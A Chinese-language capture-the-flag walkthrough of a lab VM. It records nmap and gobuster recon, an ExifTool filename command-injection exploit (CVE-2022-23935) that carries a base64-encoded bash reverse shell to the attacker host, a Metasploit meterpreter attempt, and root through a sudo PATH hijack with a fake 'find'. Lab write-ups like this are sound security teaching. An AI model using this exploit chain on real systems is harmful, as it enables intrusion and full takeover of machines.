# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 23:20 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00026s latency).
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.42 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 23:22 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 23:22 EDT
Warning: 192.168.21.6 giving up on port because retransmission cap hit (10).
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.0011s latency).
All 65535 scanned ports on dev.medusa.hmv (192.168.21.6) are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.10 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.6      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 23:24 EDT
Nmap scan report for dev.medusa.hmv (192.168.21.6)
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.69 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,php,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 13235]
/.html                (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://192.168.21.6/assets/]                                               
/upload.php           (Status: 200) [Size: 3773]
/service.html         (Status: 200) [Size: 3417]
/css                  (Status: 301) [Size: 310] [--> http://192.168.21.6/css/]                                                  
/manual               (Status: 301) [Size: 313] [--> http://192.168.21.6/manual/]                                               
/js                   (Status: 301) [Size: 309] [--> http://192.168.21.6/js/]                                                   
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/service.html可以上传jpg图片，尝试上传一个图片马

<img width="991" height="195" alt="图片" src="https://github.com/user-attachments/assets/05f68b41-2d6a-4ed6-83eb-5130939478a9" />

<img width="550" height="383" alt="图片" src="https://github.com/user-attachments/assets/428d0fb2-791d-4fdd-b6d2-c99bb74ccc46" />

寻找一下相关漏洞

```
msf6 > search exiftool 12

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
   1    \_ target: JPEG file                                    .                .          .      .
   2    \_ target: TIFF file                                    .                .          .      .
   3    \_ target: DjVu file                                    .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection                                                              
After interacting with a module you can manually set a TARGET with set TARGET 'DjVu file'
msf6 exploit(unix/fileformat/exiftool_djvu_ant_
perl_injection) > use 0                                         
[*] Using configured payload cmd/unix/php/meterpreter/reverse_tcp
msf6 exploit(unix/fileformat/exiftool_djvu_ant_
perl_injection) > options 

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.21.10    yes       The listen address (an in
                                     terface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   2   DjVu file



View the full module info with the info, or info -d command.
msf6 exploit(unix/fileformat/exiftool_djvu_ant_
perl_injection) > run                                           
[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
┌──(kali㉿kali)-[~]
└─$ mv /home/kali/.msf4/local/msf.jpg ~
```

上传没有成功，再找一下

```
#!/bin/bash
# CVE-2022-23935 exiftool version 12.37
# If the program gives error, you can exploit it manually with the following commands:
#echo "ping 10.10.14.70 -c1" | base64
#mv imagen.png "echo base64_code|base64 -d|sh|"
function ctrl_c(){
	echo -e "\n\n [!] Exiting...\n\n"
	exit 1
}

# Ctrl+c
trap ctrl_c INT

if [ "$(id -u)" == "0" ]; then
	mv image.png "echo $(echo 'whoami'|base64) | base64 -d | sh"
else
	echo -e "\n[!] You need execute this program with root user"
fi
```

这个漏洞是exiftool 在解析文件名时会执行命令

```
┌──(kali㉿kali)-[~]
└─$ echo -n "bash -i >& /dev/tcp/192.168.21.10/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxLjEwLzEyMzQgMD4mMQ==
```

<img width="1053" height="108" alt="图片" src="https://github.com/user-attachments/assets/904706e6-470a-4003-88a8-d8536636b2d9" />

拿到了反弹shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                       
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.6] 34234
bash: cannot set terminal process group (496): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1755406158$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

找到了一个png图片，传过来看看是什么

```
www-data@w140:/var/www$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ghost:x:1000:1000:ghost,,,:/home/ghost:/bin/bash
www-data@w140:/var/www$ ls -la
ls -la
total 48
drwxr-xr-x  4 root     root  4096 Feb 21  2023 .
drwxr-xr-x 12 root     root  4096 Jan 29  2023 ..
-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png
drwxr-xr-x  7 root     root  4096 Feb 14  2023 html
drwx------  5 www-data root  4096 Aug 17 00:49 uploads
```

扫出来一串字符串：BaoeCblP5KGJDmA

<img width="876" height="460" alt="图片" src="https://github.com/user-attachments/assets/e0969b29-ee55-4d65-b46e-e5fddf192479" />

切换到ghost看一下

```
ghost@w140:~$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
ghost@w140:~$ cat /opt/Benz-w140                                                                                                            
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140      
# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]
then
/bin/cat log/w140.log > log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi
# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
ghost@w140:~$ cd /tmp
ghost@w140:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > /tmp/find
ghost@w140:/tmp$ chmod +x /tmp/find
ghost@w140:/tmp$ sudo PATH=/tmp:$PATH /opt/Benz-w140
root@w140:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
